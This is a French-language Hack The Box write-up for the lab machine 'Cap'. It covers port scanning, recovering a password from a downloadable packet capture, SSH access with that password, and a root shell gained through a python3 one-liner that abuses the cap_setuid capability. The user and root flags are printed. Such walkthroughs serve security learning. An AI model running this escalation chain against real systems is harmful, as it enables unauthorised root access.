---
title: "[HTB - Easy] Cap"
description: "Writeup by jsthope"
date: 2023-03-28T00:00:00+00:00
tags: ["HTB", "Easy", "writeup", 'FR']
type: post
image: /images/cap/cap.png
showTableOfContents: true
---
![HTB Cap Image](/images/cap/cap.png "HTB Cap Image")
# nmap
On va tout d’abord scanner les ports ouverts de l’ip:
```┌─[eu-vip-23]─[10.10.14.5]─[htb-jsthope@htb-xbv1dyv8fx]─[~]
└──╼ [★]$ nmap 10.10.10.245
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-07 22:35 BST
Nmap scan report for 10.10.10.245
Host is up (0.18s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.69 seconds
```
# http
Sur le site, on remarque qu'on est connecté de base à l'utilisateur "Nathan".
On trouve ensuite que le site permet de télécharger des trames réseaux:
http://10.10.10.245/data/0
On download le pcap numero 0 et on l'analyse ensuite avec Wireshark:
![pcap](/images/cap/pcap.png "pcap")

On trouve alors le mot de passe de Nathan (utilisé pour le ftp)

# ssh
Le mot de passe ftp de Nathan et le même que sur son ssh:
```
─[eu-vip-23]─[10.10.14.5]─[htb-jsthope@htb-xbv1dyv8fx]─[~]
└──╼ [★]$ ssh nathan@10.10.10.245
```
On récupère alors le flag de l'user:
```
nathan@cap:~$ ls
user.txt
nathan@cap:~$ cat user.txt
ebd6713a9539c2c987b214d1a48bc21c
```
# privesc
On cherche si on a des vulnérabilités liées aux capabilities:
```
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
On voit tout de suite ici que python3.8 est sûrement vulnérable à un exploit de type setuid. 
On peut trouver les exploits de capabilities sur [gfobins](https://gtfobins.github.io/gtfobins/python/#capabilities):
```
nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```
On est bien root !
Il ne reste plus qu'a récupérer le dernier flag:
```
# cat /root/root.txt
0987dc49d725b0d0f38fe7f6349b266c
```